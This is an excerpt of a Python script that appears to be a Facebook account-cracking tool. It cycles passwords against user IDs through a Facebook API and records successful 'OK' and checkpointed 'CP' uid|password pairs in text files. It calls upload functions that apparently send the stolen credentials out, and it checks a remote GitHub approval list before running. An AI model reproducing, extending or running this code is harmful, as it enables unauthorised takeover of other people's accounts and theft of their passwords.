...
def helpnote():
    ...
    subprocess.check_output(['am', 'start', 'https://www.facebook.com/bhatti4055'])
    exit(' [*] FACEBOOK :  https://www.facebook.com/bhatti4055')
...
class Main():
    ...
    def __init__(self):
        ...
        self.loop = 0
        try:
            plr = requests.get('https://github.com/SUBHANOk/PRO.SO64-32/blob/main/Approval.txt').text
            if basesplit in plr:
                key = basesplit
    ...
    def api(self, uid, pwx):
        ...
        for pw in pwx:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r \x1b[0;92m[Brand-OK] %s|%s\x1b[0;97m         ' % (uid, pw)
                self.ok.append('%s|%s' % (uid, pw))
                open('ok.txt', 'a').write(' [Brand-OK] %s|%s\n' % (uid, pw))
                uploadoks()
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                print '\r \x1b[0;93m[Brand-CP] %s|%s\x1b[0;97m         ' % (uid, pw)
                self.cp.append('%s|%s' % (uid, pw))
                open('cp.txt', 'a').write(' [Brand-CP] %s|%s\n' % (uid, pw))
                uploadcps()
                break
            else:
                continue
